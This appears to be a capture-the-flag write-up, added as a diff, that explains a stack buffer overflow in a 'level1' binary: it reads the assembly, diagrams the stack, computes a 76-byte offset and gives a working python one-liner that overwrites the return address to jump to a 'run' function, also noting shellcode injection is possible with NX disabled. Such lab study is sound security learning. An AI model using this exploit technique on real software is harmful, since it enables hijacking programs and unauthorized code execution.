@@ -1,0 +1,45 @@
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (64)
+aaaaaaaaaaaaaaaa (16)
+aaaa (4)
+0x08048444 run function address
+
+Run function address: 0x08048444
+Little endian: \x44\x84\x04\x08  ← bytes reversed!
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08 (all command)
+
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+
+
+
+What the assembly tells us
+asmsub $0x50,%esp        ← allocates 0x50 = 80 bytes on stack
+lea 0x10(%esp),%eax   ← buffer starts at esp+0x10 = 16 bytes offset
+call gets             ← reads input with NO size limit ← vulnerable!
+ret                   ← returns to... wherever return address points
+So the actual buffer size is:
+0x50 - 0x10 = 0x40 = 64 bytes
+
+The stack layout RIGHT NOW
+When main is executing, memory looks like this:
+
+High addresses
+┌─────────────────────┐
+│ return address      │   4 bytes
+├─────────────────────┤
+│ saved EBP           │  4 bytes
+├─────────────────────┤
+│ 8 bytes (gap)       │  ← between buffer and EBP
+├─────────────────────┤
+│                     │
+|   buffer (64 bytes) │
+│                     │
+├─────────────────────┤
+│ 8 bytes (padding)   │  ← below buffer
+└─────────────────────┘
+Low addresses  ← esp points here, stack grows this way
+
+
+
+"Note: shellcode injection is also possible here
+since NX is disabled — ret2func was chosen
+for simplicity"
